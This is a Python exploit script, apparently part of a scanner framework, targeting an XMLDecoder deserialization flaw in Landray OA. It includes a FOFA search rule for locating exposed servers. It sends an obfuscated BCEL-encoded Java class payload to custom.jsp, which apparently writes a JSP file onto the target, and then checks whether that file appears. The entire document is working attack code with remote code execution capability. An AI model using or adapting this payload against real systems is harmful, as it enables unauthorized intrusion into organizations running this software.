#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests

from Config.config_proxies import proxies
from Config.config_requests import ua

requests.packages.urllib3.disable_warnings()

# 脚本信息
######################################################
NAME='Landray_OA_xmldecoder_getshell'
AUTHOR="境心"
REMARK='蓝凌OA xmldecoder 反序列化漏洞'
FOFA_RULE='app="Landray-OA系统"'
######################################################


def poc(target):
    result = {}
    target_url = target+"/sys/ui/extend/varkind/custom.jsp"
    headers = {
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-cn",
        "Accept-Encoding": "gzip, deflate", "Origin": "null", "Connection": "close", "Upgrade-Insecure-Requests": "1",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = {"var": "{\"body\":{\"file\":\"/sys/search/sys_search_main/sysSearchMain.do?method=editParam\"}}",
            "fdParemNames": "11",
            "fdParameters": "<java><void class=\"com.sun.org.apache.bcel.internal.util.ClassLoader\"><void method=\"loadClass\"><string>$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$dbV$dbF$U$dd$D62B$E0$98KHI$934$N$Q$c0$N$974$e5$da$d8$60c0$E0$d8$b1iKeY$d8rdI$95d$Ci$ff$a7$cfy1$5de$ad$7e$40$7f$a8o$5d$3d$psu$dd$8b$d7$d2$5c$ce$ec$d9$3ag$9f$99$p$ff$fe$e7$af$bf$B$98$c5O$o$kbA$c0$a2$88$W$y$88X$c22oV$C$f8Z$c4kDDD$b1$wb$N1$Rq$ac$8bH$60C$c0$a6$80$a4$88N$y$E$b0$rb$Q$db$7c$f2$s$80$j$de$ef$8a$90$b0$X$40J$c0$be$88$7e$ce$7e$c0$fbt$A$Z$O$7e$cb$d7$b3$bc$c9$J8$U$f0$NC$db$a2fh$ee2C$eb$e8X$9a$c1$X5$L$wCWR3$d4$edj$r$af$da$fbr$5e$tK0i$w$b2$9e$96m$8d$cf$_$8d$3e$b7$a49$MO$93$8e$ad$84$x$b2f$84$cb$f2$89$ivU$c7$N$c7d$c7$ddpLcM$v$99$91$e8Zr$81A$5c$3bUT$cb$d5L$836$f98$9e$a1$7f$f40$e9m$d2e$a3$YN$b9$b6f$U$X$3cOd$bbH$b0$de$s$cb$M$81EE$bf$f2$5b$d1$J$d6s$L$V$d5e$c7$n$90$cf$92$dd$S$f7$bc$J$81d$d1$c0$cd$d8$9a$ab$da$d3$M$a1$3aF3$c3$3b7v$82$f9$9d$92$aa$eb$MBAUH$Y$9ba0$e9T$8dpEs$94p$e4uj$ed$e5$ecj$7d$85s$d6A$f5w0t$a6$5cYy$b7$r$5b$9eX$a47$J$902$ab$b6$a2$c64$$$5e$a8Q$a1$v$ee$83$84O$f1$88$e1$c9$ffPT$c0$b7$S$be$c3$91$84$ef$nS$ce$f2Ni$wa$90$e3$96$adR$x$m$_AAA$80$w$e1$YE$B$r$J$g$ca$C$deI$d0Q$R$60H0a$91$c6M$82g$Yh$94$zR$d5tO$D$n$b3$W$99Ll$c7$q$fc$A$5b$82$D$97$e1$9en$W5$e3$88$3b$3aUv$y$JUX$3c$96$T$Gw$t$9a$3e$v$bc$dd$ad$w$eb$hV$de$d8s$f2ZQ$x$c4K$96r$W$e1O$v$R$cf$9d$c9$99t5$X$3f$9dK$ac$ef$e9$ca$cc$ae$93$88E$9c$5c$s$f6$n$97$8a$94$e5x$ba$y$T$$_$d9$z$w$95$f4$fblF$3fK$ac$e7$5e$e4$e3s$baR$89ir$e6$d4$w$c4u$5d9$9b$d56$f7$j$7d$a7$b8$b4D$t$aby$a2$Y$ba$h$D$93$f0$k$a7$94$ec$83$fd$d8$e4$x$ee$f4$99$84$P8$91$f0$pOE$ef$N$fc$fa$fc$de$ny$93$_$ab$8a$7b$c7$b4_$b2U$b9$40g$40$a9$da$b6j$b8W$f3$be$d1$b1d$p$8aNN$a8$a8$baQ$93Rw$eaz$877i$ca$9e$a7Cw$e0$b7$96$f8$9e$a6$L$M$ed$3a$N$3c$L$5d$cc$d1$sw$ab$c9M$e9j0Q$d0$e4$d1$8em$ba$U$Y$85$bbj$d6$_$eb$e3$x$7f$i$95$C$d3$dc$b3p$p$86$c8F$fe$jA$a2x$d1$d2E$f1$$$D$c3$83$bf$b1$de$ac$S$df$e0$3f$ad1t$Q$T$afK$97$v$b9$e21T7$7c$b0$c7$x$8et$7bN$H$97G$e5$V$85$bb$89$b8$$$L$7e$c7$d25J$e5$b3f$c25$adDm$b2e$a9$G$a5v$f2$3f$b4$bes$87x$Js$cd$abJ$Rj$b65$7d$5dP$o$d5$e3c$9e$d9$fe$a6NE$e8$a6$8e$kF$9a3$I$5e$99$d3I$i$bf$a2$9b$8e$8aG$f4$ady$I$fek$F$e3$a5$86$e6$8fi6C3F$bd$7f$fc$i$ec$p$NZ$f0$84Z$fei$C$E$f8$Q$c0g4$92$ea$m$3c$c5$e7$d4$3f$a3$c7G$96$R$b4c$Uc$97T_R$cfQ$ed$Xh$c9$9e$a35$d3H$d7Ad$d2$z$bav$8c$e3$f9$j$ba$A$s$c83$c6$e9X$x$bd$ae$8dVJ$bf$c0W$83$3f$d8V$83$b09$5eC$a0$86$f6$g$c4$g$3a$92$X$90$b2$X$e8$a4$97$dd$7b$k$ec$aa$a1$bbu$ba$86$9e$60$90$9a$gz$cf$d1$b7$V$Mm_$a0$9f$A$D$f3$be$L$Mf$87$7c$935$M$F$ef$9fcx$de$3f1$e4$af$e1$c1D$N$9f$fc$M$df$e6G$cf$t$85$w$e6$Ii$c4$bd$9e$o$8f$81n$f2$b6$H$f7$R$c4$oz$b1$82$3e$ac$p$84$y$7d$5d$8f0$40$f8$n$da1$88$o$86$bd$c8$96$c9g$J$ZL$d2n$d0$ae$E$c2$f8$82$98$X$v$ca$X$98$s$jV$I7C$b6V$e2$Z$a6$bf$Ds$U$7b$96$UzI6$3f$89$c8ui$f9$D$c7$C$5e$91$K$f8$ca$Tq$fe$_$99$bd$a4$e2$3e$I$A$A</string><void method=\"newInstance\"></void></void></void></java>\r\n"}
    requests.post(target_url, headers=headers, data=data, timeout=5, verify=False,proxies=proxies)
    poc_url = target+"/login_test.jsp"
    res = requests.get(poc_url, timeout=5, verify=False)

    if res.status_code == 200 and "this is a friendly test" in res.text:
        result['poc'] = NAME
        result['poc_url'] = poc_url
        return result


if __name__ == '__main__':
    poc("http://127.0.0.1")